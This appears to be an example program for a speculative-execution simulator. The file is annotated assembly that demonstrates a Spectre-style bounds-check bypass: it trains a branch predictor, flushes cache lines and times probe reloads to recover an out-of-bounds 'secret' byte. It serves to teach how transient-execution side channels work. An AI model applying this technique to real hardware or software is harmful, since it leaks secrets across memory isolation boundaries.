# A user-mode bounds-check bypass you can watch happen:
#   python3 -m specsim run examples/transient.s --trace | less
# Lines starting with '~' are transient instructions: they executed on the
# mispredicted path and were squashed.  At the end, a1 = reload time of the
# probe slot of the out-of-bounds byte (42), a2 = reload time of slot 43.
.data
.align 64
limit:  .quad 4
.align 64
array:  .byte 1, 2, 3, 4
        .zero 196
secret: .byte 42                # array[200]: out of bounds
.align 64
xs:     .quad 0, 1, 2, 3, 0, 1, 2, 3, 200
.text
_start:
    li      t0, PROBE_BASE + 42 * PROBE_STRIDE
    clflush 0(t0)
    li      t0, PROBE_BASE + 43 * PROBE_STRIDE
    clflush 0(t0)
    la      t0, secret          # the "secret" must be cached for the short
    lb      t0, 0(t0)           # transient window (try deleting these two lines)
    la      s0, xs
    li      s1, 9
loop:                           # victim(0..3) twice to train, then victim(200)
    ld      a0, 0(s0)
    call    victim
    addi    s0, s0, 8
    addi    s1, s1, -1
    bnez    s1, loop
    li      t0, PROBE_BASE + 42 * PROBE_STRIDE
    rdcycle t1
    lb      t2, 0(t0)
    rdcycle t3
    sub     a1, t3, t1
    li      t0, PROBE_BASE + 43 * PROBE_STRIDE
    rdcycle t1
    lb      t2, 0(t0)
    rdcycle t3
    sub     a2, t3, t1
    halt

# victim(x): if (x < limit) touch PROBE[array[x] * 4096]
victim:
    la      t0, limit
    clflush 0(t0)               # make the bounds check slow
    ld      t1, 0(t0)
    bgeu    a0, t1, victim_out
    la      t2, array
    add     t2, t2, a0
    lb      t3, 0(t2)
    slli    t3, t3, 12
    li      t4, PROBE_BASE
    add     t4, t4, t3
    lb      t5, 0(t4)
victim_out:
    ret
